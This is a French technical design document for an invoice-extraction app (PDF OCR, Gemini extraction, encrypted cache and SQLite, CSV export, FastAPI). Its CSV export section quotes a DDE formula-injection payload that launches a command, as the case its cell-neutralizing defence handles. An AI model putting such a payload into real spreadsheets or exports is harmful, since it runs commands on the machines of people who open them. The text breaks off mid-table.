# Technical Design — InvoiceAI

> **Document technique vivant.** Rempli au fur et à mesure des étapes P1 → P5.
> Contient les **contrats des modules**, décisions de design local, schémas de données.
>
> **Différent de** :
> - `PROJECT_BRIEF.md` → le "pourquoi" (business, scope, contraintes)
> - `docs/architecture_assistant_ia_factures.svg` → la vue macro (composants + flux)
> - `docs/adr/` → les décisions structurantes (1 fichier = 1 décision)
> - `docs/wireframes.md` → l'UI

---

## 📋 Méthode — Design juste-à-temps

On design **1 module à la fois**, **juste avant** de le coder :

1. **Contrat** = signatures des fonctions/classes publiques (entrée, sortie, erreurs).
2. **Choix de design locaux** = décisions internes au module + le "pourquoi".
3. **Points d'incertitude** = ce qu'on ne sait pas encore et qu'on découvrira en codant.

**Règle** : si on apprend quelque chose en codant → on revient corriger ce doc. C'est **normal**, c'est même **souhaité**. Un doc figé qui ne reflète plus la réalité est pire qu'un doc vivant qui bouge.

---

## 🧭 Sommaire

### Standards transverses (s'appliquent à tous les modules)
- [🎯 Conventions de code](#-conventions-de-code)
- [⚠️ Hiérarchie d'exceptions](#️-hiérarchie-dexceptions)
- [🧪 Stratégie de tests](#-stratégie-de-tests)

### Modules

| # | Module | Statut | Étape |
|---|--------|--------|-------|
| 1 | [Module OCR — Extraction de texte PDF](#1-module-ocr-) | ✅ Validé | P1 (implémentation en cours) |
| 2 | [Module LLM — Extraction structurée (Gemini)](#2-module-llm-) | ⬜ | P2 |
| 3 | [Modèle de données — Schéma SQLite](#3-modèle-de-données-) | ⬜ | P2/P3 |
| 4 | [Module API — Endpoints FastAPI](#4-module-api-) | ⬜ | P3 |
| 5 | [Module UI — Streamlit](#5-module-ui-) | ⬜ | P4 |

Légende : ⬜ vide · ⏳ en cours · ✅ rempli et validé

---

## 🎯 Conventions de code

Standards appliqués à **tout le code Python** du projet.

### Style
- **Formatage** : `ruff format` (config dans `pyproject.toml`)
- **Linting** : `ruff check` — 0 warning avant chaque commit
- **Import order** : géré par `ruff` (isort compatible)

### Typage
- **Type hints obligatoires** sur toutes les fonctions publiques (paramètres + retour)
- `from __future__ import annotations` en tête de chaque fichier (compat Python 3.11+)
- `X | None` au lieu de `Optional[X]` (syntaxe moderne)

### Docstrings
- Style **Google** (choisi pour sa lisibilité et son support dans les IDE)
- Docstring **obligatoire** sur : fonctions publiques, classes, méthodes publiques
- Docstring **optionnel** sur : méthodes privées (`_snake_case`), fonctions triviales <5 lignes

Exemple :

```python
def extract_text_from_pdf(pdf_path: Path) -> ExtractedDocument:
    """Extract text content from a PDF invoice file.

    Args:
        pdf_path: Absolute path to the PDF file to process.

    Returns:
        ExtractedDocument containing text, page count, and warnings.

    Raises:
        PDFCorruptedError: If the file cannot be opened as a PDF.
        EmptyDocumentError: If the PDF contains no extractable text.
    """
```

### Naming
- `snake_case` : fonctions, variables, modules, fichiers
- `PascalCase` : classes, exceptions
- `UPPER_CASE` : constantes de module
- **Préfixe `_`** : membres privés (convention Python, pas d'enforcement)

### Autres
- **1 classe = 1 fichier** dès que la classe fait > 50 lignes
- **Pas de `print()`** en dehors des scripts CLI → utiliser `logging`
- **Pas de secrets en dur** → toujours via `os.getenv(...)` ou `python-dotenv`
- **F-strings** partout (pas de `%` ni de `.format()`)

---

## ⚠️ Hiérarchie d'exceptions

Toutes les exceptions custom héritent d'une racine commune (`InvoiceAIError`). Ça permet aux couches hautes (API, UI) de faire un `try/except InvoiceAIError` global sans devoir connaître toutes les sous-classes.

**Fichier** : `src/core/exceptions.py`

### Arbre

```
InvoiceAIError (racine — tous les modules)
├── OCRError (module OCR — P1)
│   ├── PDFCorruptedError       # PDF illisible / mal formé
│   ├── EmptyDocumentError      # PDF valide mais sans texte extractible
│   └── UnsupportedPDFError     # PDF scanné image (V1 ne gère pas)
│
├── LLMError (module LLM — P2)
│   ├── ExtractionFailedError   # LLM a répondu mais parsing JSON KO
│   ├── RateLimitError          # Quota Gemini atteint (free tier mesuré : 20 req/JOUR/modèle)
│   └── ProviderTimeoutError    # Gemini timeout
│
├── ValidationError (module validation — P2)
│   └── InconsistentTotalsError # HT + TVA ≠ TTC (tolérance ±0.02 €)
│
├── StorageError (module DB — P3)
│   ├── DuplicateInvoiceError   # SHA-256 déjà en base
│   └── InvoiceNotFoundError    # ID inexistant
│
└── APIError (module API — P3)
    ├── FileTooLargeError       # > 10 Mo
    └── InvalidFileTypeError    # MIME ≠ application/pdf
```

### Règles
- **Chaque exception embarque un message clair** (destiné aux logs, pas à l'utilisateur final)
- **Traduction utilisateur** = responsabilité de la couche UI, pas des modules métier
- **Ne pas hiérarchiser trop profond** : max 2 niveaux au-dessus de la racine

### Squelette minimal

```python
# src/core/exceptions.py
class InvoiceAIError(Exception):
    """Base exception for all InvoiceAI errors."""


class OCRError(InvoiceAIError):
    """Base for OCR module errors."""


class PDFCorruptedError(OCRError):
    """Raised when a PDF file cannot be parsed."""
```

*Les sous-classes seront ajoutées au fur et à mesure des modules P1 → P3.*

---

## 🧪 Stratégie de tests

**Framework** : `pytest` + `pytest-cov` (déjà dans `requirements.txt`).

### 3 types de tests

| Type | Dossier | Quoi | Vitesse | Marker pytest |
|------|---------|------|---------|---------------|
| **Unit** | `tests/unit/` | 1 fonction ou classe, dépendances mockées | Rapide (<100 ms) | (défaut) |
| **Integration** | `tests/integration/` | Plusieurs modules ensemble, SQLite en mémoire | Moyen (<2 s) | `@pytest.mark.integration` |
| **LLM (slow)** | `tests/slow/` | Appel réel à Gemini | Lent (>2 s) | `@pytest.mark.slow` |

- **Développement quotidien** : `pytest -m "not slow"` (rapide, offline)
- **Avant merge / release** : `pytest` (tout, incluant `slow`)

### Fixtures partagées

**Fichier** : `tests/conftest.py`

Fixtures à prévoir :
- `sample_invoice_pdf` → chemin vers 1 PDF dans `tests/fixtures/pdfs/`
- `sample_invoice_data` → dict de données attendues pour ce PDF (**vérité terrain**)
- `tmp_db` → SQLite en mémoire, propre à chaque test
- `mock_gemini_response` → réponse Gemini pré-enregistrée pour éviter les vrais appels

### Mocks Gemini

**Règle** : les tests unit **ne doivent jamais** appeler l'API Gemini (coût, flakiness, offline).

- Les vraies réponses Gemini sont **enregistrées** dans `tests/fixtures/gemini_responses/*.json`
- Rejouées via `pytest-mock` (`monkeypatch` du client Gemini)
- Seuls les tests `@pytest.mark.slow` appellent vraiment l'API

### Coverage cible

- **Objectif V1** : ≥ **70 %** sur `src/` (excluant `src/ui/` — Streamlit teste mal)
- **Vérifié en CI** (P5) : échec du build si coverage < 70 %
- **Rapport local** : `pytest --cov=src --cov-report=term-missing`

### Ce qu'on **ne teste PAS** en V1
- L'UI Streamlit (test manuel + screenshots)
- La **qualité** des prompts LLM (on teste le **parsing** de la réponse, pas la pertinence)
- Le format visuel des exports CSV/Excel (juste la présence des colonnes attendues)

---

## 1. Module OCR 📄

**Rôle** : lire un PDF de facture/devis et retourner le **texte brut**, prêt pour le LLM (module 2).
**Fichier** : `src/ocr/extractor.py`
**Statut** : ✅ Contrat validé (V1) — implémentation en cours

### 1.1 Interface publique

```python
from __future__ import annotations
from dataclasses import dataclass, field
from pathlib import Path


@dataclass(frozen=True)
class ExtractedDocument:
    """Résultat d'une extraction OCR sur un PDF.

    Attributes:
        text: Texte concaténé de toutes les pages, séparé par
            "\n\n---PAGE {n}---\n\n" entre chaque page.
        page_count: Nombre total de pages du PDF.
        warnings: Messages non-bloquants
            (ex: "page 2 sans texte", "PDF de 15 pages, performance dégradée").
        source_file: Chemin absolu du PDF source (traçabilité).
        metadata: Métadonnées PDF brutes (auteur, date création, producteur…).
    """

    text: str
    page_count: int
    source_file: Path
    warnings: list[str] = field(default_factory=list)
    metadata: dict[str, str] = field(default_factory=dict)


def extract_text_from_pdf(pdf_path: Path) -> ExtractedDocument:
    """Extract text content from a PDF invoice/quote file.

    Args:
        pdf_path: Absolute path to the PDF file to process.

    Returns:
        ExtractedDocument containing text, page count, warnings, and metadata.

    Raises:
        FileNotFoundError: If pdf_path does not exist (Python natif, non wrappé).
        PDFCorruptedError: If the file cannot be opened as a valid PDF.
        EmptyDocumentError: If the PDF is valid but contains zero extractable text.
        UnsupportedPDFError: If the PDF appears to be a scanned image (no text layer).
    """
    ...
```

### 1.2 Choix de design (et les "pourquoi")

| # | Choix | Décision | Pourquoi |
|---|-------|----------|----------|
| 1 | **Fonction pure vs classe** | Fonction (`extract_text_from_pdf`) | Stateless, simple à tester, pas de config à porter |
| 2 | **Type du chemin** | `Path` obligatoire (pas `str`) | Type-safe, évite les bugs de séparateurs Windows/Linux |
| 3 | **Détection PDF scanné** | Si `len(text.strip()) < 100` → `UnsupportedPDFError` | Un PDF scanné retourne peu/pas de texte via pdfplumber. Seuil à valider empiriquement. |
| 4 | **Séparateur multi-pages** | `\n\n---PAGE {n}---\n\n` | Aide le LLM à comprendre la structure (utile pour factures 2-3 pages) |
| 5 | **Extraction des tables** | **V1 : intégrées au texte via `.extract_text()`** | Simple, on laisse le LLM se débrouiller. Si résultat pauvre en P2 → passer à `.extract_tables()` en V1.1 |
| 6 | **Nettoyage du texte** | `strip()` par page + normalisation `\s+` → ` ` | Réduit le bruit sans casser la structure |
| 7 | **Immutabilité** | `@dataclass(frozen=True)` | Empêche les modifs accidentelles après extraction |
| 8 | **Logging** | `logger.info` début/fin extraction, `logger.warning` par warning ajouté | Traçabilité pour debug + observabilité future |
| 9 | **PDF encryptés** | Traités comme `PDFCorruptedError` en V1 (pas d'exception dédiée) | Rare en facturation PME, à raffiner si un utilisateur remonte le cas |

### 1.3 Comportement attendu

**Cas nominal (99 % du temps V1)** :
- PDF texte natif (généré par Word / Excel / logiciel de facturation)
- 1 à 3 pages
- `extract_text_from_pdf()` retourne un `ExtractedDocument` avec `text` non vide et `warnings=[]`

**Cas d'erreur (levée d'exception)** :

| Situation | Exception |
|-----------|-----------|
| Fichier n'existe pas | `FileNotFoundError` (Python natif) |
| Fichier existe mais pas un PDF valide | `PDFCorruptedError` |
| PDF valide, mais 0 caractère extractible sur toutes les pages | `EmptyDocumentError` |
| PDF valide, mais `< 100 chars` extraits (probablement scan image) | `UnsupportedPDFError` |
| PDF encrypté / protégé par mot de passe | `PDFCorruptedError` (V1) |

**Warnings (non-bloquants, ajoutés à `ExtractedDocument.warnings`)** :
- Une page individuelle est vide → `"page {n} sans texte extractible"`
- Le PDF a plus de 10 pages → `"PDF long ({n} pages), extraction complète mais performance dégradée"`

### 1.4 Points d'incertitude (à trancher en codant P1)

- [x] **Seuil "PDF scanné" à 100 chars** — validé sur les 5 fixtures réelles (304 à 359 chars chacune, large marge) et sur `tests/fixtures/pdfs/short_text.pdf` (10 chars). Reste arbitraire pour de vrais PDF utilisateurs très courts (1 ligne) — à réajuster si des faux positifs apparaissent en usage réel.
- [x] **Extraction des tables** — validé : `pdfplumber.extract_text()` reconstitue correctement les lignes de facture car les colonnes sont dessinées à la même hauteur `y` dans nos PDF (`reportlab`). Pas besoin de `.extract_tables()` en V1. À réévaluer si des PDF réels (autre logiciel de facturation) cassent l'alignement.
- [x] **Encodage** — vérifié : `pdfplumber` extrait correctement les accents (testé sur `Labbé`, code point `0xE9` confirmé). Le `�` observé pendant les tests manuels était un artefact d'affichage du terminal Windows (codepage), pas une corruption des données.
- [x] **Métadonnées PDF** — gardé en V1 (`metadata: dict[str, str]`, coût nul, déjà dans le contrat validé). Aucun consommateur défini pour l'instant (LLM/DB arrivent en P2/P3) — à retirer si toujours inutilisé fin P3.

### 1.4 bis Limites anti-DoS (revue sécurité)

Un PDF est une entrée hostile. `extract_text_from_pdf` applique, avant tout envoi à Gemini : taille max (`MAX_UPLOAD_SIZE_MB`, 10), en-tête `%PDF-` obligatoire, pages max (`MAX_PDF_PAGES`, 30), texte max (`MAX_PDF_TEXT_CHARS`, 100 000) et **délai max `MAX_PDF_SECONDS` (20) avec un vrai kill** : l'analyse `pdfplumber` tourne dans un processus séparé, lancé comme une **commande indépendante** (`python -m src.ocr.worker`, réponse en JSON sur la sortie standard), qu'on tue au timeout ; un crash du parseur est contenu. Ce processus **ne reçoit pas les clés** (`GOOGLE_API_KEY`, `CACHE_ENCRYPTION_KEY`, `API_TOKEN`) dans son environnement. Dépassement → `PDFTooLargeError`. Une valeur de réglage invalide garde la valeur par défaut. Mesuré : PDF de 200 pages refusé en 0,3 s ; PDF d'une page à 300 000 opérations (824 Ko) tué à 20 s. **Pourquoi pas `multiprocessing`** : en mode `spawn` il relance le `__main__` du parent dans l'enfant ; sous Streamlit, un lanceur de tests ou un notebook, `__main__` est un autre script, que l'enfant réexécutait au lieu d'analyser le PDF (le parent attendait alors tout le délai). Plus aucune contrainte « import-safe » sur les scripts appelants. Non couvert : plafond mémoire du processus enfant, et nombre de PDF traités en parallèle (limité côté API).

### 1.5 Ce qui est **hors scope** de ce module

- ❌ OCR d'images (Tesseract, EasyOCR) → V2
- ❌ Détection de langue → responsabilité du LLM (module 2)
- ❌ Parsing structuré (montants, dates, fournisseur) → responsabilité du LLM (module 2)
- ❌ Persistance en base → responsabilité du module Storage (module 3)

---

## 2. Module LLM 🤖

**Rôle** : envoyer le texte extrait à Gemini et récupérer les données structurées (fournisseur, dates, montants, lignes), avec validation métier et cache.
**Statut** : ⏳ En cours — sous-module 2.1 (schémas) implémenté, le reste à venir

### 2.1 Schémas de données — `src/models/schemas.py` ✅

```python
class InvoiceLineItem(BaseModel):
    description: str
    quantity: float
    unit_price: float
    total: float


class ExtractedInvoice(BaseModel):
    invoice_number: str | None = None
    date: str | None = None  # ISO 8601 (YYYY-MM-DD)
    supplier: str | None = None
    client: str | None = None
    lines: list[InvoiceLineItem] = []
    subtotal_ht: float | None = None
    tva_rate: float | None = None
    total_ttc: float | None = None
    extraction_confidence: Literal["high", "low"] = "high"
    warnings: list[str] = []
```

**Choix de design** :
| # | Choix | Décision | Pourquoi |
|---|-------|----------|----------|
| 1 | Tous les champs métier `\| None` | Le LLM peut retourner `null` plutôt qu'inventer une valeur (garde-fou anti-hallucination, cf. `PROJECT_BRIEF.md` §5.5) |
| 2 | `Pydantic BaseModel` (pas dataclass) | Nécessaire pour `PydanticOutputParser` de LangChain (§2.2) — validation + parsing JSON automatique |
| 3 | `extraction_confidence: Literal["high","low"]` | Posé par le LLM par défaut à `"high"`, repassé à `"low"` par le module de validation (§2.3) si incohérence détectée — pas d'exception levée, juste un flag consommé par l'UI |
| 4 | Pas de champ `currency` en V1 | Hors scope V1 (`PROJECT_BRIEF.md` §9 — multi-devises reporté en V2) |

### 2.2 Adapter Gemini — `src/llm/gemini_adapter.py` ✅

**Implémenté** : `extract_invoice_data(document: ExtractedDocument) -> ExtractedInvoice`

**Choix de design** :
| # | Choix | Décision | Pourquoi |
|---|-------|----------|----------|
| 1 | `llm.with_structured_output(ExtractedInvoice)` plutôt que `PydanticOutputParser` manuel | Structured output natif de Gemini (function calling) — plus fiable qu'un parsing JSON texte fait à la main, moins de code |
| 2 | Retry via `tenacity` sur `RateLimitError` + `ProviderTimeoutError` uniquement (pas `ExtractionFailedError`) | Erreurs transitoires (quota, indispo réseau) valent la peine d'être retentées ; un JSON malformé est un problème de prompt/schéma, pas résolu par un retry aveugle |
| 3 | `_build_structured_llm()` isolée dans sa propre fonction | Permet de la monkeypatcher dans les tests sans mocker les internals de `langchain`/`google-genai` |
| 4 | Backoff exponentiel `wait_exponential(multiplier=2, min=2, max=10)`, 3 tentatives max | Cohérent avec le rate limit Gemini (15 req/min = ~1 req/4s) sans faire attendre l'utilisateur trop longtemps |
| 5 | `google.genai.errors.ClientError`/`ServerError` distingués par `.code` (429 → `RateLimitError`, autre 4xx → `ExtractionFailedError`, 5xx → `ProviderTimeoutError`) | Mapping direct des codes HTTP Gemini vers notre hiérarchie d'exceptions métier |

**Erreurs (corrigé après revue sécurité)** : `langchain-google-genai` re-lève les erreurs HTTP sous ses propres classes (`GoogleRateLimitError`, `GoogleAuthenticationError`…) qui **ne sont pas** des `ClientError`. Mapping actuel : 429 → `RateLimitError` (retry), 401/403 → `LLMAuthError` (jamais retry), autres 4xx → `ExtractionFailedError` (message sans le corps de la réponse), 5xx → `ProviderTimeoutError`. Clé absente → `LLMAuthError` (fail closed) ; `load_dotenv()` ne remplace pas les variables déjà définies. Voir `docs/security/P2_SECURITY_REVIEW.md`.

**Prompt** : documenté séparément dans `docs/prompt_engineering.md` (garde-fous "if unsure, return null" + 1 exemple few-shot). **Testé et validé sur 5/5 factures fictives (100% de précision)**.

**Tests** : `tests/unit/test_gemini_adapter.py`, 5 tests, aucun appel réel à Gemini (`_build_structured_llm` monkeypatché + `tenacity.nap.time.sleep` neutralisé pour éviter les vrais délais de retry en test).

### 2.3 Validation métier — `src/services/validate_invoice.py` ✅

**Contrat prévu** : `validate_invoice(invoice: ExtractedInvoice) -> ExtractedInvoice`
- Règle 1 : `sum(line.total for line in lines) ≈ subtotal_ht` (tolérance ±0,02 €)
- Règle 2 : `subtotal_ht × (1 + tva_rate) ≈ total_ttc` (tolérance ±0,02 €)
- Ne lève pas d'exception → passe `extraction_confidence = "low"` + ajoute un message dans `warnings` si incohérence

**Implémenté** : 3 règles (ajout d'une règle 0 : `quantity × unit_price ≈ total` par ligne). Une règle est **ignorée** si une de ses entrées est `null` (un `null` du LLM est une réponse légitime, pas une incohérence). Fonction pure : retourne une copie (`model_copy`), l'entrée n'est pas mutée, les `warnings` existants sont conservés.

| # | Choix | Pourquoi |
|---|-------|----------|
| 1 | Écart arrondi au centime avant comparaison | Bug trouvé par les tests : `abs(60.02 - 60.0)` = `0.0200000000000031` > 0.02 en float. `Decimal` écarté en V1 (le schéma est en `float`) |
| 2 | Tolérance absolue 0,02 € | Couvre l'arrondi ligne par ligne ; pas de tolérance relative en V1 |

**Incertitude ouverte** : `tva_rate` attendu en fraction (0.20). Si le LLM renvoie 20, la règle 3 lèvera un warning (faux positif visible, pas silencieux) — à surveiller sur factures réelles.

**Tests** : `tests/unit/test_validate_invoice.py`, 12 cas, 100 % de couverture du module.

### 2.4 Cache SHA-256 — `src/services/cache.py` ✅

**Contrat prévu** :
- `get_cached(pdf_hash: str) -> ExtractedInvoice | None`
- `store_cache(pdf_hash: str, invoice: ExtractedInvoice) -> None`
- Clé = SHA-256 du contenu binaire du PDF (évite de rappeler Gemini sur un fichier déjà traité)

**Implémenté** : `hash_pdf(path)`, `get_cached(hash)`, `store_cache(hash, invoice)`, `delete_cached(hash)` (ajouté pour le RGPD : le cache contient des données de facture).

| # | Choix | Pourquoi |
|---|-------|----------|
| 1 | 1 fichier `.enc` par hash dans `CACHE_DIR` (défaut `data/cache/`, gitignoré), **chiffré et authentifié (Fernet : AES + HMAC-SHA256)** avec `CACHE_ENCRYPTION_KEY` | Le cache contient des données personnelles : illisible sans la clé, toute modification est détectée. Sans clé → `StorageError` (jamais d'écriture en clair). Disque plutôt que SQLite : SQLAlchemy pas encore en place, signatures inchangées si migration en P3 |
| 2 | Hash validé (`[0-9a-f]{64}`) avant de devenir un nom de fichier | Empêche le path traversal si un appelant passe une valeur venant de l'utilisateur |
| 3 | Entrée corrompue / schéma obsolète = miss + suppression, pas d'exception | Pire cas = 1 appel Gemini de plus, jamais un crash |
| 4 | Écriture atomique (fichier temporaire puis `os.replace`) | Un crash en cours d'écriture ne laisse jamais un JSON tronqué |
| 5 | Erreurs d'E/S = `StorageError` (nouvelle branche de la hiérarchie) | Cohérent avec la hiérarchie `InvoiceAIError` |

**Rétention RGPD (revue sécurité)** : durée de vie `CACHE_TTL_DAYS` (30 par défaut, une valeur invalide garde le défaut), horodatage **à l'intérieur** du jeton authentifié (toucher le fichier ne prolonge rien). Chaque entrée embarque son hash et est refusée si le fichier a été renommé sur un autre hash. Entrée expirée / altérée / clé différente → miss + suppression. `purge_expired()` (à appeler au démarrage / chaque jour en P3) supprime aussi les anciennes entrées `.json` en clair et les `.tmp` orphelins. Limites : la clé est dans `.env` sur la même machine (protège les sauvegardes et l'exfiltration du dossier, pas une machine compromise), pas de rotation de clé (MultiFernet) en V1. Vider `data/cache/` après un changement de prompt ou de règles de validation.

**Tests** : `tests/unit/test_cache.py`, ~25 cas (chiffrement sur disque, altération d'un bit, entrée déplacée, mauvaise clé, expiration, purge, accès concurrents, clé absente).

### 2.5 Orchestration — `src/services/pipeline.py` ✅

**Contrat** : `process_invoice(pdf_path: Path) -> ExtractedInvoice` — hash → cache → OCR → Gemini → validation → écriture cache.

- Le résultat **validé** est mis en cache (un hit saute OCR, Gemini et validation). Si les règles de validation ou le prompt changent, vider `data/cache/`.
- Aucune exception n'est attrapée : elles remontent (`OCRError`, `LLMError`, `StorageError`) et l'API/UI les traduit.
- Une extraction en erreur n'est jamais mise en cache.
- **Tests** : `tests/integration/test_pipeline.py` (marker `integration`, Gemini remplacé par un faux compteur d'appels) — vérifie facture valide, montants incohérents → `low`, 2ᵉ appel sans Gemini, erreur OCR propagée.

---

## 3. Modèle de données 🗃

**Rôle** : schéma SQLite pour persister les factures traitées.

**Fichiers** : `src/models/invoice_record.py` (table), `src/core/database.py` (moteur, sessions),
`src/core/crypto.py` (chiffrement partagé avec le cache), `src/services/repository.py` (accès aux données).

### 3.1 Table `invoices` (une seule en V1)

| Colonne | Type | Clair / chiffré | Rôle |
|---------|------|-----------------|------|
| `id` | UUID (texte, PK) | clair | Identifiant non énumérable |
| `created_at` | date UTC | clair | Date de traitement ; départ de la rétention |
| `expires_at` | date UTC | clair | `created_at` + `DEFAULT_RETENTION_DAYS` (30) ; jamais prolongée par une modification |
| `status` | `high` / `low` | clair | Fiabilité de l'extraction (contrainte CHECK) |
| `pdf_hash` | SHA-256 (64 hex) | clair | Permet d'effacer aussi l'entrée du cache (RGPD) |
| `schema_version` | entier | clair | Version du contenu chiffré, pour les évolutions |
| `payload` | binaire | **chiffré (Fernet)** | Fournisseur, client, numéro, date, lignes, montants, avertissements, nom du fichier |

### 3.2 Choix

| # | Choix | Pourquoi |
|---|-------|----------|
| 1 | **Chiffrement par champ** (`payload`), pas SQLCipher | Le brief demande « SQLite chiffré » : SQLCipher est lourd à installer sous Windows. Ici un fichier `.db` copié sans la clé ne révèle ni nom, ni montant. Même clé que le cache (`CACHE_ENCRYPTION_KEY`), même trust boundary |
| 2 | Le `payload` embarque l'`id` de la ligne, vérifié à la lecture | Une ligne copiée sur un autre `id` (déplacement de payload) est refusée, comme pour le cache |
| 3 | Recherche / filtres **en mémoire** après déchiffrement | Les colonnes chiffrées ne s'interrogent pas en SQL ; quelques centaines de factures restent instantanées. `limit` plafonné (500) |
| 4 | Dates stockées en **UTC** via un type dédié (`UTCDateTime`) | SQLite n'a pas de fuseau : sans ça on relit des dates « naïves » et on compare mal |
| 5 | **Rétention appliquée aussi à la lecture** : une ligne expirée est traitée comme absente avant même la purge | La purge tourne au démarrage : une app ouverte 3 jours ne doit pas servir des données périmées |
| 6 | `delete` efface le **cache d'abord**, puis la ligne | Si l'effacement du cache échoue on peut réessayer ; l'inverse laisserait une copie orpheline |
| 7 | `PRAGMA secure_delete=ON` | Sinon SQLite laisse le contenu supprimé dans les pages libres du fichier : un `DELETE` RGPD ne supprimerait rien physiquement |
| 8 | Ligne illisible (mauvaise clé, altérée) : ignorée dans la liste (avertissement), `StorageError` sur lecture directe, **purgée quand même à l'expiration** (colonnes en clair) | Une ligne corrompue ne doit ni planter la liste ni rester éternellement |
| 9 | Pas de migrations (Alembic) en V1 : `create_all` + `schema_version` | Base locale mono-utilisateur ; à introduire dès que le schéma change après un vrai usage |
| 10 | Date de filtre = date de la facture si elle est valide (ISO), sinon date de traitement | C'est la colonne « Date » de l'écran Historique |

Fichier `.db` : permissions `0o600` sur POSIX (sans effet sous Windows). `git` l'ignore (`data/*.db*`).

**Évolution option B (plusieurs utilisateurs)** : table `users` + colonne `user_id` sur `invoices`.

### 3.3 Export CSV — `src/services/export.py` (étape 2, fait)

`invoices_csv(invoices, columns=..., locale="fr")` (une ligne par facture, colonnes choisies dans une liste autorisée, défaut = les 6 colonnes du wireframe), `lines_csv(invoices)` (une ligne par ligne de facturation), `suggested_filename(...)` (dates uniquement), `neutralize(text)`.

| # | Choix | Pourquoi |
|---|-------|----------|
| 1 | Locale `fr` par défaut : séparateur `;`, virgule décimale, UTF-8 avec BOM ; variante `intl` | Excel en français ouvre un `,` sur une seule colonne et lit `120.00` comme du texte |
| 2 | **Injection de formules** : toute cellule de texte commençant (après espaces) par `=`, `+`, `-`, `@`, ou par tabulation / retour chariot reçoit `'` devant | Un nom de fournisseur hostile suffit à planter une formule, voire `=cmd\|' /C calc'!A0` |
| 3 | Les montants sont formatés par notre code, jamais préfixés | Un avoir en `-100,00` doit rester un nombre |
| 4 | Montant TVA = TTC − HT (2 décimales), colonne vide si l'un manque | Le schéma ne stocke que le taux |
| 5 | Nom de fichier construit avec des dates seulement | Jamais de texte venant de l'utilisateur dans `Content-Disposition` |

Excel `.xlsx` reporté. Revue : `docs/security/P3_EXPORT_REVIEW.md`.

### 3.4 Routes — `src/api/app.py`, `routes.py`, `schemas.py` (étape 3)

| Route | Rôle |
|-------|------|
| `POST /invoices` | PDF → upload sécurisé → extraction → validation → enregistrement → PDF supprimé. 201 + facture |
| `GET /invoices` | Liste : `q`, `date_from`, `date_to`, `status`, `limit` (1-500), `offset` |
| `GET /invoices/export.csv` | `ids` (≤ 200) **ou** filtres ; `kind` (`invoices`/`lines`), `columns`, `locale` |
| `GET /invoices/{id}` | Détail (404 si inconnu ou expiré) |
| `PUT /invoices/{id}` | Corrections utilisateur, revalidées par le serveur |
| `DELETE /invoices/{id}` | Effacement RGPD (ligne + cache) : 204 |
| `GET /health` | `{"status": "ok"}`, seule route sans jeton, aucune donnée |

| # | Choix | Pourquoi |
|---|-------|----------|
| 1 | Jeton exigé sur tout le routeur (`Depends(require_token)`) sauf `/health` | Une route ajoutée plus tard est protégée par défaut |
| 2 | `/docs`, `/redoc`, `/openapi.json` désactivés (sauf `API_DOCS=1`) | Ne pas publier la carte de l'API |
| 3 | `TrustedHostMiddleware` : `Host` ∈ `ALLOWED_HOSTS` (défaut `127.0.0.1,localhost`) | Contre le DNS rebinding : une page web dont le domaine est redirigé vers 127.0.0.1 |
| 4 | Pas de CORS | Aucune origine web n'a de raison d'appeler l'API |
| 5 | En-têtes sur **toutes** les réponses (erreurs et 413 compris) : `Cache-Control: no-store`, `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: no-referrer`, CSP `default-src 'none'` | Les réponses contiennent des données personnelles : ni cache navigateur ni proxy |
| 6 | Ordre des middlewares (du dehors vers le dedans) : hôte → en-têtes → limite de taille | Un `Host` invalide est refusé avant tout ; le 413 porte aussi les en-têtes |
| 7 | `PUT` : modèle dédié `extra="forbid"` avec seulement les champs modifiables ; `extraction_confidence` et `warnings` **recalculés** par `validate_invoice` | Sinon un client s'attribue « fiabilité élevée » (mass assignment) |
| 8 | Réponses par modèles explicites : jamais `pdf_hash` | Détail interne |
| 9 | Erreurs de validation 422 : seulement `loc` et `msg`, jamais la valeur reçue | Le comportement par défaut de FastAPI renvoie `input` |
| 10 | `id` de chemin : UUID canonique en minuscules, sinon 422 | Rien d'autre ne peut être un de nos identifiants |
| 11 | Extraction dans un thread (`run_in_threadpool`) ; routes de lecture en `def` (FastAPI les met dans un thread) | La boucle asynchrone ne doit jamais attendre Gemini (7-33 s) |
| 12 | Limiteurs (fréquence, parallélisme) seulement sur `POST /invoices`, utilisés dans la boucle asynchrone | Ils ne sont pas thread-safe par conception (13a) |
| 13 | Démarrage : refus de démarrer sans `API_TOKEN` valide ni clé de chiffrement valide ; purge des factures expirées, du cache et des uploads orphelins | Fail closed ; rétention appliquée sans attendre |
| 14 | Lancement `--no-access-log` | Les recherches passent dans l'URL (`?q=Orange`) : le journal d'accès d'uvicorn écrirait des données personnelles |
| 15 | Doublons : un même PDF envoyé deux fois crée deux factures (l'extraction, elle, vient du cache) | Simple ; l'utilisateur supprime |

**Enseignements du test sur un vrai serveur (étape 3 terminée)**
- Le cache est une optimisation : un échec d'**écriture** (disque, chemin Windows > 260 caractères) est journalisé et ignoré, sinon on perdait une réponse Gemini déjà payée en quota. Une clé absente/invalide échoue toujours **avant** l'appel à Gemini (fail closed).
- Le gestionnaire d'erreurs journalise le **type** de l'exception et le code HTTP, jamais son message (chemins, contenu).
- Un chemin de projet très profond peut dépasser `MAX_PATH` (260) sous Windows : cache et uploads deviennent inécrivables (500 « stockage »). Garder le projet près de la racine.
- Lancement : `--no-access-log --no-server-header` (voir `make api`).
- Aucun objet créé à l'import : `app = create_app()` au niveau du module lisait le vrai `.env` (toutes les clés) dans tout processus important le module. L'API se lance avec `uvicorn --factory src.api.app:create_app`.

Revue : `docs/security/P3_API_REVIEW.md`.

Limites connues : la purge n'a lieu qu'au démarrage (la rétention est de toute façon appliquée à la lecture) ; pas de plafond
global d'appels Gemini par jour (le 429 est traduit proprement).

---

## 4. Module API 🌐

**Rôle** : exposer les endpoints REST utilisés par l'UI.

**Fichier** : `src/api/routes.py` (13b, à venir) — voir ci-dessous la couche sécurité (13a).

### 4.1 Modèle d'usage V1 : un seul utilisateur, en local (option A)

L'API écoute **uniquement sur `127.0.0.1`** et exige un jeton (`Authorization: Bearer <API_TOKEN>`). Pas de comptes, pas de mots de passe : le jeton empêche un autre programme de la machine, ou un site web ouvert dans le navigateur qui appellerait `localhost`, d'utiliser l'API. **L'application ne doit pas être exposée sur Internet telle quelle** (à écrire dans le README). Passage futur à plusieurs utilisateurs (option B) : le jeton devient un identifiant et les factures se rattachent à lui, rien de ce qui suit n'est jeté.

### 4.2 Sécurité de l'upload et de l'API (13a) — `src/api/`

| Fichier | Contenu |
|---------|---------|
